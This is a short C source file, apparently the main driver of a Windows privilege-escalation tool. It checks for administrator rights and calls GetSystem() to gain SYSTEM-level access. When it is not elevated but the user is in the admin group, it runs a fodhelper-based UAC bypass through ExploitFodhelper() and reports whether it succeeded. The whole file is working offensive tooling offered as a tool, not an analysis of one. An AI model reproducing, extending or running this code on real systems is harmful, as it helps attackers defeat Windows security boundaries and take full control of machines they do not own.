#include <Windows.h>
#include <stdio.h>
#include "CheckSystem.h"
#include "BypassUac.h"
#include "GetSystem.h"


int main(int argc, char* argv[]) {
	if (IsRunAsAdmin()) {
		printf("[i] Process running with admin priv !\n");
		GetSystem();
	} else {
		printf("[W] Process not running with admin priv\n");
		if (IsUserInAdminGroup()) {
			printf("[i] User is in the admin group\n");

			char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
			if (CurrentProcessPath == NULL)
				return FALSE;
			if (GetModuleFileNameA(0, CurrentProcessPath, MAX_PATH) == 0) {
				free(CurrentProcessPath);
				return TRUE;
			}

			if (ExploitFodhelper(CurrentProcessPath))
				printf("[OK] UAC Bypass worked\n");
			else
				printf("[X] UAC Bypass failed\n");
			free(CurrentProcessPath);
		} else {
			printf("[X] User is no in the admin group !\n");
		}
	}
	system("pause");
	
	return FALSE;
}